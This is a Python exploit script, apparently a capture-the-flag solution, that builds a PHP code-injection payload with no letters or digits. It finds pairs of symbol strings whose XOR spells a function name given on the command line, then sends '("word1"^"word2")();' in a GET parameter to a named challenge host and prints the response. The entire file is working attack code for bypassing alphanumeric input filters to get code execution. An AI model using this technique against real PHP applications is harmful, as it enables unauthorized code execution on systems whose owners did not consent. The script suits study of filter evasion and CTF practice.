#!/usr/bin/env python3

import string
import requests
import sys

def get_xor_strings(expected, valids):
  word1 = ""
  word2 = ""
 
  for i in expected:
    for valid in valids:
      result = chr(ord(i) ^ ord(valid))
      if result in valids:
        word1 = word1 + result
        word2 = word2 + valid
        break
  return word1, word2

def xor(str1, str2):
  result = []
  for i, j in zip(str1, str2):
    result.append(chr(ord(i) ^ ord(j)))
  return ''.join(result)

valids = []
for item in string.printable:
  if item not in (string.ascii_letters + string.digits):
    valids.append(item)

valids = valids[:len(valids)-3]
valids.remove('$')
valids.remove('=')

print("[+] Generated valids => {}".format(valids))

expected = sys.argv[1]
word1, word2 = get_xor_strings(expected, valids)
print("[+] Word 1 {} - Word2 {}".format(word1, word2))
 
result = xor(word1, word2)
print("[+] Verifying... Should be {} => {}".format(expected, result))
 
payload = "(\"{}\"^\"{}\")();".format(word1, word2)

print("[+] Sending payload {}".format(payload))


params = {
  'x': payload
}

response = requests.get('http://junior-php.peykar.io/', params=params)
print(response.content.decode())